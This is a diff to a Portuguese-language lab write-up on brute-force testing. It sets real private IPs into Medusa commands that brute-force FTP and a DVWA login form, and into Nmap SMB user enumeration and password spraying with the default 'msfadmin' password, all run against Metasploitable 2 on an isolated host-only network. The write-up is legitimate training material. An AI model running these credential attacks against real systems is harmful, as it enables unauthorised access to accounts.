@@ -19,8 +19,8 @@ Para garantir a segurança e o isolamento dos testes, foi configurado um ambient
     * **Tipo:** Rede Apenas de Anfitrião (Host-Only)
     * **Justificativa:** Esta configuração cria uma rede privada e isolada, permitindo que as máquinas virtuais (Kali e Metasploitable 2) se comuniquem entre si, sem expor os serviços vulneráveis à rede local ou à internet.
 * **Verificação de Conectividade:**
-    * IP do Kali Linux: `[SEU_IP_KALI]`
-    * IP do Metasploitable 2: `[IP_DO_METASPLOITABLE]`
+    * IP do Kali Linux: `192.168.56.101`
+    * IP do Metasploitable 2: `192.168.56.102`
     * Teste de conectividade realizado com sucesso via comando `ping`.
 
 _Imagem da topologia de rede:_
@@ -43,7 +43,7 @@ Foram simulados três cenários de ataque distintos para avaliar a segurança de
 * **Ferramenta:** Medusa
 * **Comando Executado:**
     ```bash
-    medusa -h [IP_DO_METASPLOITABLE] -U usuarios.txt -P senhas.txt -M ftp -v 4
+    medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp -v 4
     ```
     * `-h`: Host alvo.
     * `-U`: Caminho para a lista de usuários.
@@ -65,7 +65,7 @@ Foram simulados três cenários de ataque distintos para avaliar a segurança de
 * **Ferramenta:** Medusa
 * **Comando Executado:**
     ```bash
-    medusa -h [IP_DO_METASPLOITABLE] -u admin -P senhas.txt -M http -m DIR=/dvwa/login.php -m FORM-DATA="username=%USER%&password=%PASS%&Login=Login" -v 4
+    medusa -h 192.168.56.102 -u admin -P senhas.txt -M http -m DIR=/dvwa/login.php -m FORM-DATA="username=%USER%&password=%PASS%&Login=Login" -v 4
     ```
     * `-u admin`: Foca o ataque no usuário `admin`.
     * `-M http`: Módulo para o protocolo HTTP.
@@ -87,13 +87,13 @@ Foram simulados três cenários de ataque distintos para avaliar a segurança de
 
 1.  **Passo 1: Enumeração de Usuários com Nmap**
     ```bash
-    nmap --script smb-enum-users.nse -p 445 [IP_DO_METASPLOITABLE]
+    nmap --script smb-enum-users.nse -p 445 192.168.56.102
     ```
     * Este comando utilizou um script do Nmap para listar os usuários disponíveis no serviço SMB. A lista foi salva em `usuarios_smb.txt`.
 
 2.  **Passo 2: Execução do Password Spraying com Medusa**
     ```bash
-    medusa -h [IP_DO_METASPLOITABLE] -U usuarios_smb.txt -p msfadmin -M smbnt
+    medusa -h 192.168.56.102 -U usuarios_smb.txt -p msfadmin -M smbnt
     ```
     * `-U`: Lista de usuários enumerados.
     * `-p msfadmin`: Testa a **senha única** `msfadmin` contra todos os usuários.
